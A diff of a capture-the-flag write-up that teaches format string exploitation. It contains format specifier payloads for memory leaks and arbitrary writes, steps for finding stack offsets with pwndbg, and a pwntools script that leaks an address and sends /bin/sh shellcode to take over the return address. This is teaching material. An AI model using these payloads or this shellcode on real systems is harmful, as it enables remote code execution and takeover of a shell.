@@ -18,10 +18,10 @@ Instead of treating the input as plain text, the function interprets format spec
 
 Common format specifiers used in exploitation:
 
-%p   -> prints a pointer (useful for leaking addresses)
-%x   -> prints data in hexadecimal (stack dumping)
-%s   -> treats value as a pointer and reads memory (arbitrary read)
-%n   -> writes the number of printed bytes to an address (arbitrary write)
+%p   -> prints a pointer (useful for leaking addresses)  
+%x   -> prints data in hexadecimal (stack dumping)  
+%s   -> treats value as a pointer and reads memory (arbitrary read)  
+%n   -> writes the number of printed bytes to an address (arbitrary write)  
 
 Impact:
 - Information leak (reading memory)
@@ -31,26 +31,26 @@ Impact:
 
 Examples:
 
-1. Stack leak:
-Input: "%p %p %p %p"
+1. Stack leak:  
+Input: "%p %p %p %p"  
 Output: leaks stack values
 
 2. Finding offset:
-Input: "AAAA %p %p %p"
-Look for 0x41414141 in output
+Input: "AAAA %p %p %p"  
+Look for 0x41414141 in output  
 
 3. Arbitrary read:
-Input: "%7$s" + address
-Reads memory at given address
+Input: "%7$s" + address  
+Reads memory at given address  
 
 4. Arbitrary write:
-Input: "%1234x%10$n"
-Writes 1234 to the address at position 10 on the stack
+Input: "%1234x%10$n"  
+Writes 1234 to the address at position 10 on the stack  
 
 5. Precise write (byte-wise):
-Use %hhn, %hn, %n to control write size
+Use %hhn, %hn, %n to control write size  
 
-Summary:
+Summary:  
 Format string vulnerabilities allow attackers to read and write memory by abusing printf-style functions when input is not properly sanitized.
 
 Let's break down the exploitation step 
@@ -106,12 +106,11 @@ That means we found the offset of name
 
 ![](./img/23.png)
 
-The name variable is at the `6` offset on the stack.
+The name variable is at the `6` offset on the stack.  
 Note: Here this information will not be use, but it is always useful to know where the variable address you have control over is on the stack.
 
 #### 2. Calculate the address of name
-Here have been challenging to do.  
-You need to do it locally with `gdb/pwndbg` to find a leaked memory address who is always at the same distance of name so you can calculate his address.  
+With the help of `gdb/pwndbg` you need to find a leaked memory address who will always at the same distance of name so you can calculate his address.  
 With a lot of trial and errors I found that if you subtract `0x20` form the address leaked with `%9$p` you get the info address.  
 I will show case how I found it with pwndbg
 
@@ -139,9 +138,9 @@ It will open like this:
 
 ![](./img/24.png)
 
-On the top panel we can see that we have a leaked address.
+On the top panel we can see that we have the address leaked by `%9$`
 
-On the bottom panel on the stack part we can see that the address of the info variable (where we send "yo") is `0x7ffe40631700` in this example. 
+On the bottom panel, on the stack part we can see that the address of the info variable (where we send "yo") is `0x7ffe40631700` in this example. 
 
 ![](./img/25.png)
 
@@ -177,7 +176,7 @@ conn = remote(HOST, PORT)
 # payload to leak the address
 payload = b"%9$p"
 
-# Send the payload after we encounter "> "
+# Send the payload after we encounter "> " to leak the address
 conn.sendlineafter(b"> ", payload)
 
 # Get the response
@@ -198,7 +197,7 @@ info_addr = leaked_addr_hex - 0x20
 # Display the info variable in hex
 log.info(f"info address = {hex(info_addr)}")
 
-# Info is 32 bytes and the shellcode 23 bytes so we need to fill the remaining 9 bytes with "\x00"
+# info is 32 bytes and the shellcode 23 bytes so we need to fill the remaining 9 bytes with "\x00"
 # Overwrite the RBP with 8 bytes
 # And write the info_addr value into the return value
 payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
